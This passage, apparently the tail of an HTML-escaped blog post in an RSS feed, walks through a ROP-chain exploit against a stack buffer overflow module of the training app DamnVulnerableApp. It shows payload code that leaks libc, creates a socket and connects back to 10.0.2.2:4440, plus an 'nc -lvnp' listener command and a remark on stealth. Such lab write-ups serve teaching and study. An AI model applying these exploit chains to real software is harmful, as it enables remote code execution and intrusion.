payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x02\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x11\x58&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x0a\x00\x02\x02&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rax
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_deref_rdi_rax
&lt;span style="color:#75715e"># Connect to 10.0.2.2:4440&lt;/span>
&lt;span style="color:#75715e"># rdx = size&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdx
payload &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x10&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x7&lt;/span>
&lt;span style="color:#75715e"># rsi = addr of socketaddr_in&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rsi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>)
&lt;span style="color:#75715e"># rdi = sockfd&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> p64(u64(writable_memory) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_rax_deref_rdi
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_mov_rdi_rax_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> writable_memory
&lt;span style="color:#75715e"># Call function --&amp;gt; syscall instead of libc call, because this returns errno&lt;/span>
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_pop_rax
payload &lt;span style="color:#f92672">+=&lt;/span> p64(&lt;span style="color:#ae81ff">0x2a&lt;/span>)
payload &lt;span style="color:#f92672">+=&lt;/span> gadget_syscall
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets take a step back and see the individual steps the ROP - chain performs:&lt;/p>
&lt;ol>
&lt;li>&lt;code>compute_libc_base&lt;/code> computes the base address of &lt;code>libc.so&lt;/code> by &amp;ldquo;leaking&amp;rdquo; a &lt;code>libc.so&lt;/code> address from &lt;code>.got@libStackBufferOverflowModule.so&lt;/code> into a register and writing that address into &lt;code>writable_memory&lt;/code>&lt;/li>
&lt;li>&lt;code>call_libc_function&lt;/code> calls &lt;code>socket@libc.so&lt;/code> and puts the file descriptor into &lt;code>writable_memory+0x8&lt;/code>&lt;/li>
&lt;li>Then a structure of type &lt;code>struct sockaddr_in&lt;/code> is crafted in global memory and describes where to connect to.&lt;/li>
&lt;li>Finally &lt;code>connect@syscall&lt;/code> is called. At least on my end, calling &lt;code>connect@libc.so&lt;/code> caused an error. This might be due to the fact that we wrote into global memory located in &lt;code>libart.so&lt;/code> (&amp;hellip; whyever that would be the case though). For this PoC, we just need the app to perform a connection. Therefore we can use a system call to do so. We did &lt;strong>not&lt;/strong> use a system call to create the socket, as there where no gadgets of the form &lt;code>syscall; ret&lt;/code> (or &lt;em>ropper&lt;/em> did not tell me). Thus, after the &lt;code>syscall&lt;/code> gadget, the behaviour of the app is undefined.&lt;/li>
&lt;/ol>
&lt;p>To catch the PoC, run the following command on your local machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvnp &lt;span style="color:#ae81ff">4440&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now one might argue: &amp;ldquo;Why don&amp;rsquo;t we just run a classical &lt;code>execve&lt;/code> ROP - chain?&amp;rdquo;.&lt;/p>
&lt;p>The answer to that lies in the implementation of &lt;em>DamnVulnerableApp&lt;/em>. The manager app will &lt;em>clean up&lt;/em> the vulnerable process, if the connection between them breaks. Observe that calling &lt;code>execve&lt;/code> will definitely destroy the connection between the vulnerable app and the manager app. This forces the manager app to send a &lt;code>SIGKILL&lt;/code> to the vulnerable app, thus ending its life even before the program to be executed via &lt;code>execve&lt;/code> is initialized. As &lt;code>execve&lt;/code> does not create a new process (and creating a new process might even violate the permissions of the vulnerable app), i.e. the PID stays the same, the manager app will always shutdown &lt;code>execve&lt;/code> attempts. Also one could argue that it is better practice to keep the target app alive for stealth - reasons.&lt;/p>
&lt;h1 id="conclusion">Conclusion&lt;/h1>
&lt;p>In summary, the &lt;em>EasyStackBufferOverflowModule&lt;/em> can be exploited by using a classical ROP - chain after leaking enough information. It is possible to get &lt;em>arbitrary code execution&lt;/em> limited only by the constraints that &lt;em>DamnVulnerableApp&lt;/em> (and its permissions and security mechanisms) imposes.&lt;/p></content></item></channel></rss>